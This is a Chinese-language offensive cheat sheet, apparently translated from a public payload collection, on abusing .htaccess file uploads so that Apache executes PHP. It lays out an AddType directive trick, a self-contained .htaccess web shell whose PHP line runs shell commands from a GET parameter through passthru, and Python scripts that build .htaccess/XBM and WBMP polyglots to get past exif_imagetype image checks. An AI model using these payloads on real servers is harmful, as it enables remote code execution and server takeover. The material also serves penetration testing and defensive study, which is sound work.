# .htaccess

上传一个`.htaccess`文件以覆盖Apache规则并执行PHP。
"黑客还可以使用“.htaccess”文件技巧上传带有任何扩展名的恶意文件并执行它。举个简单的例子，想象一下上传到易受攻击服务器的一个`.htaccess`文件，该文件具有`AddType application/x-httpd-php .htaccess`配置，并且还包含PHP shell代码。由于恶意的`.htaccess`文件，Web服务器会将`.htaccess`文件视为可执行的PHP文件并执行其恶意的PHP shell代码。需要注意的一点是：`.htaccess`配置仅适用于上传`.htaccess`文件的同一目录及其子目录。"

## 摘要

* [AddType指令](#addtype指令)
* [独立的.htaccess](#独立的htaccess)
* [多语言.htaccess](#多语言htaccess)
* [参考文献](#参考文献)

## AddType指令

上传一个包含以下内容的`.htaccess`文件：`AddType application/x-httpd-php .rce`，然后上传任何带有`.rce`扩展名的文件。

## 独立的.htaccess

```python
# 自包含的.htaccess网络外壳 - htshell项目的一部分
# 由Wireghoul编写 - http://www.justanotherhacker.com

# 覆盖默认拒绝规则以使.htaccess文件可通过Web访问
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# 将.htaccess文件解释为PHP文件。这发生在Apache从.htaccess文件中解释指令之后
AddType application/x-httpd-php .htaccess
```

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

## 多语言.htaccess

如果服务器端使用`exif_imagetype`函数来确定图像类型，则可以创建`.htaccess/image`多语言文件。

[支持的图像类型](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants)包括[X位图（XBM）](https://en.wikipedia.org/wiki/X_BitMap)和[WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format)。在`.htaccess`中忽略以`\x00`和`#`开头的行，可以使用这些脚本生成有效的`.htaccess/image`多语言文件。

* 创建有效的`.htaccess/xbm`图像

    ```python
    width = 50
    height = 50
    payload = '# .htaccess文件'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
    ```

* 创建有效的`.htaccess/wbmp`图像

    ```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess文件'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
    ```

## 参考文献

* [通过.htaccess攻击Web服务器 - Eldar Marcussen - 2011年5月17日](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [防止不受限制的文件上传漏洞 - Narendra Shinde - 2015年10月22日](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - 2019年1月20日](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)